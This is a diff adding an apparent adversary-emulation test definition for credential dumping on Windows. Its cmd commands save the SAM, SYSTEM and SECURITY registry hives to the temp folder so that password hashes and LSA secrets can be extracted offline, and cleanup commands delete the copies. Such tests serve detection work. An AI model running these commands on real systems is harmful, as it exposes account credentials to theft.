@@ -1,0 +1,16 @@
+#TechniqueName: OS Credential Dumping: Security Account Manager
+#AtomicTestName: Registry dump of SAM, creds, and secrets
+#Description: Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated&via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7&&Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.&
+#Language: cmd
+
+#commands
+reg save HKLM\sam %temp%\sam
+reg save HKLM\system %temp%\system
+reg save HKLM\security %temp%\security
+
+
+#cleanup_commands
+del %temp%\sam >nul 2> nul
+del %temp%\system >nul 2> nul
+del %temp%\security >nul 2> nul
+
